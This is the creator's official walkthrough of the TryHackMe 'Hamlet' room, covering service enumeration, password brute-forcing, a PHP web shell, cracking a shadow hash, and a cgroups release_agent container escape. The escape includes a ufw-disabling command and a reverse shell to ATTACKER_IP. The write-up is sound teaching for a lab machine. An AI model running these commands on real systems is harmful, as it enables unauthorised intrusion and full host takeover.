# TryHackMe - Hamlet

Offical Walkthrough by [**Ingo Kleiber**](https://linktr.ee/ingokleiber) (Room Creator)

This walkthrough is based on *Hamlet v.1.1 (09.2021)*. The following will be a very straightforward and necessarily incomplete walkthrough, focusing primarily on the intended path! That said, please feel free to explore the box and find alternative ways of doing things – there are plenty! As this challenge is based on the idea of combining more than one service, the walkthrough will begin by establishing a rough overview of the system as a whole.

*Note:* `hamlet.thm` will always refer to the machine's IP.

If you are interested in a little more less-technial background regarding this room, have a look at my [accompanying blog post](https://kleiber.me/blog/2022/01/18/hamlet-on-tryhackme-learning-by-teaching).

## 1. Initial Enumeration and  Port Scanning

Let's begin our enumeration by running a quick `rustscan` followed by a more in-depth `nmap` scan.

If the box hasn't fully booted up yet, you might not see all ports. More specifically, port 8080 will take some time, most likely a couple of minutes, to come online. This is due to the fact that the service is running within a container.

`rustscan -a hamlet.thm --ulimit 5000 --timeout 5000`

```text
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.254.163:22
Open 10.10.254.163:21
Open 10.10.254.163:80
Open 10.10.254.163:501
Open 10.10.254.163:8000
Open 10.10.254.163:8080
[~] Starting Script(s)

[...]
```

`nmap -sV -sC -p- -T4 hamlet.thm`

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 11:11 EST
Nmap scan report for 10.10.146.137
Host is up (0.030s latency).
Not shown: 64526 filtered tcp ports (no-response), 1003 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 0        0             113 Sep 15 14:45 password-policy.md
|_-rw-r--r--    1 0        0            1425 Sep 15 14:48 ufw.status
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.239.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0:ef:4c:32:28:a6:4c:7f:60:d6:a6:63:32:ac:ab:27 (RSA)
|   256 5a:6d:1a:39:97:00:be:c7:10:6e:36:5c:7f:ca:dc:b2 (ECDSA)
|_  256 0b:77:40:b2:cc:30:8d:8e:45:51:fa:12:7c:e2:95:c7 (ED25519)
80/tcp   open  http        lighttpd 1.4.45
|_http-title: Hamlet Annotation Project
|_http-server-header: lighttpd/1.4.45
501/tcp  open  nagios-nsca Nagios NSCA
8000/tcp open  http        Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.48 (Debian)
8080/tcp open  http-proxy
[...]

Nmap done: 1 IP address (1 host up) scanned in 293.47 seconds
```

As we can see, there are six open ports `21`, `22`, `80`, `501`, `8000`, and `8080`.

We will now have a look at them one by one. That said, we will leave port 22 alone for now as `OpenSSH` (relatively current version) most likely is not vulnerable. Here, knowing the machine, we will take the *ideal* and intended path.

One thing that immediately stands out is that there are multiple webserver running different software. We can see, based on `nmap`, that `Apache`, `lighttpd`, and `http-proxy`.
While this is not too uncommon, it might tell us something about the system. Usually, at least when looking at one machine, we would most likely expect one (proxy) web server that handles all services and their web servers.

## 2. Exploring Services

Let's begin by looking at all of the services we've identified during our initial portscan. We are doing this to establish an understanding of the system as a whole as well as to understand the attack surface.

### Port 80 - Website

Visiting the website on port 80 (HTTP), we learn that this server is associated with a group of researchers working on Shakespeare's *Hamlet*. We also find a copy of the edition that they are using at `/hamlet.txt`.

We also learn that they are using annotation software called `WebAnno`. Furthermore, there seems to be a user (Michael Canterbury) who uses the username `ghost`. Michael, according to the website, is obsessed with "the vocabulary used by Shakespeare." This is the small OSINT part of this challenge.

Another interesting finding, as already pointed out above, is that they apparently use two different web servers. While this website runs on `lighttpd`, the other server on port 8000 runs `Apache`. By far and large, this is a small rabbit hole but also an indicator of two different systems that are at play.

Just to be sure to not miss anything, we will also use `gobuster` to look for less obvious files:

`gobuster dir -u hamlet.thm -w /usr/share/wordlists/dirb/big.txt`

```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.116
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/15 17:50:50 Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 64]
/~sys~                (Status: 403) [Size: 345]
                                               
===============================================================
2021/09/15 17:51:49 Finished
===============================================================
```

The only thing that turns up is `/robots.txt`, which conveniently contains the first flag:

```text
User-agent: *
Allow: /

THM{REDACTED}
```

Of course, you might want to run `nikto` or similar tools in order to learn more about this service. However, I can assure you that there is not much more to find here!

### Port 21 - FTP

As we've learned from the scan, the FTP server on port 21 allows anonymous logins. Let's give this a try!

`ftp hamlet.thm`

```text
Connected to 10.10.131.116.
220 (vsFTPd 3.0.3)
Name (10.10.131.116:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> dir
227 Entering Passive Mode (10,10,131,116,196,171).
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             113 Sep 15 14:45 password-policy.md
-rw-r--r--    1 0        0            1425 Sep 15 14:48 ufw.status
226 Directory send OK.
ftp> get ufw.status
local: ufw.status remote: ufw.status
227 Entering Passive Mode (10,10,131,116,198,231).
150 Opening BINARY mode data connection for ufw.status (1425 bytes).
226 Transfer complete.
1425 bytes received in 0.00 secs (715.8444 kB/s)
ftp> get password-policy.md
local: password-policy.md remote: password-policy.md
227 Entering Passive Mode (10,10,131,116,196,47).
150 Opening BINARY mode data connection for password-policy.md (113 bytes).
226 Transfer complete.
113 bytes received in 0.00 secs (422.8029 kB/s)
```

We can access the FTP server using an anonymous login in passive mode. Using active mode, at least using the standard FTP client, won't work very well. In such cases, it is often easier to use more sophisticated tools such as `FileZilla`.

On the FTP server, we can find two files `ufw.status` and `password-policy.md`.

The `ufw.status` file, assuming that the file reflects the current state of `ufw`, tells us that only select ports are opened.
This might be important information if we later want to establish a foothold using reverse shells and/or C2.

```bash
Status: active

To                         Action      From
--                         ------      ----
20/tcp                     ALLOW       Anywhere                  
21/tcp                     ALLOW       Anywhere                  
22/tcp                     ALLOW       Anywhere                  
80/tcp                     ALLOW       Anywhere                  
501/tcp                    ALLOW       Anywhere                  
8080/tcp                   ALLOW       Anywhere                  
8000/tcp                   ALLOW       Anywhere                  
1603/tcp                   ALLOW       Anywhere                  
1564/tcp                   ALLOW       Anywhere                  
50000:50999/tcp            ALLOW       Anywhere                  
20/tcp (v6)                ALLOW       Anywhere (v6)             
21/tcp (v6)                ALLOW       Anywhere (v6)             
22/tcp (v6)                ALLOW       Anywhere (v6)             
80/tcp (v6)                ALLOW       Anywhere (v6)             
501/tcp (v6)               ALLOW       Anywhere (v6)             
8080/tcp (v6)              ALLOW       Anywhere (v6)             
8000/tcp (v6)              ALLOW       Anywhere (v6)             
1603/tcp (v6)              ALLOW       Anywhere (v6)             
1564/tcp (v6)              ALLOW       Anywhere (v6)             
50000:50999/tcp (v6)       ALLOW       Anywhere (v6)             
```

Of course, this information is also valuable as we can use it to verify our portscan. Furthermore, knowing about the presence of a firewall will later inform our decision about establishing a (reverse) connection. However, some of these ports don't match services on the machine and are merely references to Shakespeare!

The `password-policy.md` file contains some information about the `WebAnno` policy:

```markdown
# Password Policy

## WebAnno

New passwords should be:

- lowercase
- between 12 and 14 characters long
```

We will later use this information in a targeted wordlist attack.

### Port 8080 - WebAnno

As we've learned on the website, the researchers are using an annotation tool called `WebAnno` [(Website)](https://webanno.github.io/webanno/). This is open-source software used to annotate texts for research. For example, researchers would use `WebAnno` to collaboratively add linguistic information to a corpus of texts. By default, this web application runs on port 8080.

![Firefox Port 8080](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/8080.png)

Sure enough, `WebAnno` is running on 8080. Unfortunately, the default credentials `admin:admin` don't work. However, keep in mind that we, most likely, know a username that fits here: `ghost`. Well, it could also be Michael, but given the very obvious hint, we are going with the former.

We could now also start exploring the application further, but there are no vulnerabilities here linked to the intended path. If we enumerate carefully, we can see/learn that the version of `WebAnno` running is possibly vulnerable to [CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105) (Credits go to [Hydragyrum](https://tryhackme.com/p/hydragyrum) who pointed this out!). Fortunately, this has been fixed in a [more recent version](https://github.com/webanno/webanno/releases/tag/webanno-3.6.11) of the tool. Of course, feel free to explore this angle as well!

### Port 8000 - Hamlet

On port 8000, we can find another web server. On it, there's a website displaying the `hamlet.txt` file we already know.

![Firefox Port 8000](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/8000.png)

However, looking at the source of the page, we learn that it's actually an iframe that embeds the `hamlet.txt` document.

```html
<iframe style="width:100%; height:100%" src="/repository/project/0/document/0/source/hamlet.txt"></iframe>
```

As this path is oddly specific, it's worth exploring what this might be. After some googling, we can come to the conclusion that `/repository/project/0/document/0/source/hamlet.txt` resembles the internal `WebAnno` file structure.

![Google Results](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/google.png)

At this point, it is crucial to understand that `WebAnno` on 8080 and this web server are connected in some way! Later, we will use this knowledge to run our foothold attack. The idea is to execute a shell that we somehow place in this path which is usually not accessible through a web server.

**Note:** While this, arguably, is a very CTFy circumstance, I have actually seen something very similar in an actual deployment. There, researchers wanted to make access to the files, managed by some research application, more convenient without having duplicates.

### Port 501 - Gravediggers

Port 501 is not something that we see very often. As we will quickly see, it's not `nagios-nsca` as suggested by `nmap`.

If we connect to the port using `netcat hamlet.thm 501`, we are greeted with one of the jokes made by a Gravedigger in *Hamlet*:

```text
Let's see, "Who builds stronger things than a stonemason, a shipbuilder, or a carpenter?"
```

If we respond, we will get back some random text from *Hamlet*.

![Gravediggers](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/gravediggers.png)

There's nothing of value – at least from a security standpoint – here. If we continue the dialogue, we will get our second flag. Of course, this joke can be found in Act 5, Scene 1. Please note that the exact quotation does not match up with the edition of *Hamlet* on the server but with a somewhat modernized version. Hence. the answer needs to contain "gallows" and not "gallowes".

This service is merely intended as a joke/rabbit hole. It might also be interpreted as a possible BoF vector. Trust me, there isn't one! If you don't, feel free to fuzz around a little!

### Overview

The following overview contains information that would be, most likely, unavailable to you at this point. However, it helps to understand the next steps a little better.

![Hamlet Overview](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/hamlet-overview.png)

In the following, we will be getting access to *WebAnno* via the *ghost* user. Then, we will leverage two services (`8080` and `8000`) to get a shell within a container (`web`). We will escape this container in order to get privileged access to the host.

## 3. Getting a Foothold

Now that we've explored quite a bit, we will gain our initial foothold on the system.

### WebAnno Wordlist Attack

Knowing that there aren't any obvious issues with `WebAnno` on 8080, we will try our luck with the `ghost` account. Knowing that Michael aka. ghost loves Shakespeare's vocabulary, we will build a custom wordlist from the `hamlet.txt` document. Also, having gained knowledge about the password policy (see FTP) will help us narrow down possible candidates.

To construct the wordlist, we will use a rather simple Python script that extracts a list of words from the file. The only somewhat clever bit in this script is turning a list of all words into a set, thus removing duplicates. Also, note that the regular expression tokenizer used here is very crude. For this, it does the job!

*Note:* If you don't care about doing this on your own, below you can find a `cewl` solution. 😀

```Python
#!/bin/python3

import re
import sys

args = sys.argv

if len(args) < 5:
    sys.exit('generate_wordlist.py file min_length max_length onlylowercase')

with open(args[1], 'r') as f:
    hamlet = f.read()

tokens = re.findall(r'\w+', hamlet)
types = set(tokens)

min_length = int(args[2])
max_length = int(args[3])
lowercase = args[4].lower() in ('True', 'true', '1')

if lowercase:
    words = [w for w in types if len(w) >= min_length and len(w) <= max_length and w.islower()]
else:
    words = [w for w in types if len(w) >= min_length and len(w) <= max_length]

for w in words:
    print(w)
```

Running `python3 create_wordlist.py hamlet.txt 12 14 True` will result in a wordlist containing 54 possible candidates. Of course, we will have to save the output of the tool in a file, for example, `python3 create_wordlist.py ... > wordlist.txt`.

Of course, instead of doing this manually, we could just use `cewl` and filter the list using `awk`: `cewl http://hamlet.thm/hamlet.txt --lowercase | awk 'length($0)>=12 && length($0)<=14' | uniq > wordlist.txt`

We will now test these candidates against `WebAnno` using the `ghost` user. While there are many ways to do this, I prefer using `BurpSuite`. Feel free to experiment with, for example, `Hydra` if you haven't done so yet. In addition, have a look at [SilverStr](https://tryhackme.com/p/SilverStr)'s [password sprayer](https://gist.github.com/DanaEpp/eb98d9031418ce646a385666c8dea092) specifically build for this room. Whichever tool we use, the service is not able to handle a lot of requests at a time. Hence, it is even more important to use a wordlist that is as limited as possible.

![BurpSuite Intruder](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/burp-wordlist.png)

It doesn't take very long to find the correct password for `ghost`. While, at least in `BurpSuite`, we could set a custom check for a correct login, it's enough to focus on the return size and/or redirects.

Fortunately, `ghost` has fairly elevated rights on `WebAnno`. Hence, we will first check the other users by changing their passwords. This is VERY loud, but who's looking! Of course, we could also simply elevate our rights within the project and use, for example, the *curation* function to see all annotations.

There are two other users registered: `ophelia` and `admin`.

In terms of privileges, the `admin` user is more or less the same as `ghost`. However, using the `ophelia` user, we can find an interesting note in the text that they are annotating:

![WebAnno Ophelia](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/webanno-ophelia.png)

Apparently, Ophelia is bad at remembering passwords and likes to misuse the tools she's using.
We also learn that this password does not work for *WebAnno*.

Please note that this has been placed in a very obvious spot. If you are interested, play around with `WebAnno`. One could have made this challenge a little harder by, for example, deactivating the annotation layer.

The takeaway here is that it is worth exploring a system and lower-level users even if we already have elevated privileges.

#### Sidequest: Ophelia Password Spraying

Following up on the newly gained credentials will most likely not contribute to rooting the system. However, it's absolutely worth exploring!

Let's try these new credentials against our known services: *SSH* and *FTP*.

* SSH does not lead to anything as it is *public key only*.
* FTP, on the other hand, is very interesting. Ophelia can log in via her credentials, and it seems as if we are on the box using her Linux user account.

![FTP Ophelia](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/ftp-ophelia.png)

As this is not the main route, we will not follow up. However, there's a flag to grab in `/home/ophelia`. Also, of course, feel free to play this angle!

We could, for example, use this to learn more about the system. There's quite a few things one can learn by just looking at the files on a server!

### WebAnno Webshell

As you might remember, we are assuming that we can reach internal *WebAnno* files using the web server on 8000. We will use this to execute a web shell placed via *WebAnno*.

Using the administrative `ghost` account, we will upload a PHP web shell to the annotation project. Fortunately, `WebAnno` lets us upload files with arbitrary extensions. This is completely intended as usually we would not be able to execute them.

![Upload PHP Web Shell](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/upload-webshell.png)

Internally, this file will be stored in `$WEBANNO/repository/project/0/document/1/source/shell.php`. `WebAnno`, interestingly, stores some things (e.g., user accounts) in a database and some things (e.g., files to be annotated) on disk. As `WebAnno` does assume that files cannot be executed, there aren't significant restrictions regarding what can be uploaded.

As we've learned before, the files are stored in a file structure like this: `/repository/project/0/document/0/source/hamlet.txt`. In order to find and access the uploaded files, we need to be aware of both integer parameters and the filename: `/repository/project/<project_id>/document/<document_id>/source/<filename>`.

Of course, we can now trigger that shell using the 8000 service.

![Shell](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/shell.png)

Awesome, we got our first shell! Of course, feel free to try to stabilize your shell! *Sorry, no Python!*

Now, it is important to realize that we do **not** have a shell in the `WebAnno` container. The code was executed by the webserver in the `web` container hosting the 8000 service.

Thinking back to the `ufw.status` file, it seems strange that we can get a shell on an arbitrary port (1234). This could either mean that the firewall, ultimately, is configured differently. However, here we are dealing with Docker containers. If you've never looked into the interplay of `Docker` and `ufw`, take a few minutes to read up on it (e.g., [TechRepublic](https://www.techrepublic.com/article/how-to-fix-the-docker-and-ufw-security-flaw/))!

In addition to all of that, it is important to understand that *WebAnno* is not vulnerable, at least not in a way that is meaningful to this challenge. Instead, we were able to leverage an intended function of *WebAnno* (i.e., annotating arbitrary files) in combination with a badly/insecurely designed system. Hence, from a methodology perspective, it makes sense to first get an understanding of the system as a whole before digging deep into individual services.

## 4. Play-Within-A-Play and Privilege Escalation

In true Shakespeare fashion, there is a play-within-a-play! Exploring the system using `ls -la /` we quickly realize that we are within a Docker environment. To make things worse, we only have a low privileged user `www-data`.

In order to do anything, we need to escalate our privileges. Let's go for the low-hanging fruit first and check `sudo -l` as well as SUID files. Of course, feel free to drop in your favorite enumeration tool as well!

![Priv. Esc. Enumeration](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/priv-esc-1.png)

While we don't have `sudo`, in a fortunate turn of events, we got `cat` with root privileges. While we cannot get a shell directly, we can read `/etc/shadow` using it ([GTFOBins](https://gtfobins.github.io/gtfobins/cat/)).

In `/etc/shadow`, we find the root hash: `root:$y$j9T$.9s2wZREDACTEDO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7:::` which is hashed using the still lesser-known `yescrypt`. This can be identified by the `$y$` in the beginning of the hash. If you've never heard of it, [have a look](https://www.openwall.com/yescrypt/)! This "new" hashing algorithm is also the new default for Debian and Ubuntu, and you'll encounter it more and more!

Fortunately, we can still crack the hash quite easily using `john` or `hashcat`.

A quick `john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt` reveals root's password. The import part, given `yescript`, is to pass the `--format=crypt` option to `john`. Also, depending on your setup, it might be necessary to run `john` as root.

![Priv. Esc. John](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/priv-esc-2.png)

Using this password, we have finally gained root access within the Docker environment.

![Priv. Esc. Root](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/priv-esc-3.png)

It's now time to explore and grab the flags in `/stage/flag` and `/root/.flag`.

Of course, we could also read the flags directly using `cat`. However, while giving us the flags, we would not be able to proceed this way. We need root privileges on the system!

### Breaking Out of the Container

Of course, having root within a container is only half of the story. Let's escape the container!

As we have very little binaries available, we will check for privileges (i.e., the container running insecurely) using a trick:

```bash
ls -la /dev | grep disk # As we don't have fdisk, we use this to find drives.

mkdir -p /mnt/host
mount /dev/xvda2 /mnt/host # Often this would be /dev/sda1. Here we're testing /boot.
```

Here, we are trying to mount a drive from the host within our container. If this succeeds, which it does, we know that we have elevated rights.

Before going on with the intended escape, it is worth mentioning that we can take a "shortcut" of sorts. Given that we have access to all drives, we can also mount the `/` filesystem of the host.

```bash
mkdir /mnt/host
mount /dev/dm-0 /mnt/host
```

![Mounting the Host](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/mount-host.png)

As the host uses [LVM](https://en.wikipedia.org/wiki/Logical_volume_management), the device (`dm-0`, a logical device) looks a little different from the usual `/dev/sda`. Nevertheless, we can mount it within the container. Now, having access to the root filesystem, we could read the flags or add our own SSH keys. Of course, SSH'ing into a server is probably a little "louder" than the method we will now pursue. That said, SSH is a lot more stable than establishing a reverse shell.

Having confirmed that we have elevated right, we can use a relatively [common method](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation), a *release_agent cgroups escape*, to escape from the container. This trick does not rely on any sort of exploit, but on cleverly 'abusing' `Docker` functionality. Here, we are specifically abusing the `release_agent` for our escape. Definitely read up on the mechanics – it's super interesting!

We will listen on port 1603 using `nc -nlvp 1603` on our attacker while executing a series of commands in our container as root:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Disable UFW
echo '#!/bin/bash' > /cmd
echo "ufw --force disable" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reverse Shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER_IP/1603 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Remember that `ufw` is active on the host, and we're trying to execute a shell on the host and not in the container. Hence the interplay between `ufw` and `Docker` does not really help us here. Hence, the easiest approach is to disable the firewall (`ufw --force disable`) completely before executing the shell. Instead, we could also just add a more specific route allowing outgoing traffic to our port: `ufw allow out from any to any port 1603 proto tcp`. Of course you can also try to bypass the firewall some other way!

You should also realize that we are assuming that `Docker` runs as `root` on the host. This, as we will see below, means that no further privilege escalation is needed after our escape onto the main stage.

![Priv. Esc. Host Root](https://github.com/IngoKl/THM-Hamlet/blob/main/solution/priv-esc-4.png)

We now have sucessfully gained a root shell on the host. 🎉🤩

As the final act, we can get our last flag in `/root/flag`.

## Flag Overview

| Flag | Location                       |
|------|--------------------------------|
| 1    | <http://hamlet.thm/robots.txt> |
| 2    | Service on port 501            |
| 3    | /home/ophelia/flag             |
| 4    | /stage/flag in the container   |
| 5    | /root/.flag in the container   |
| 6    | /root/flag                     |
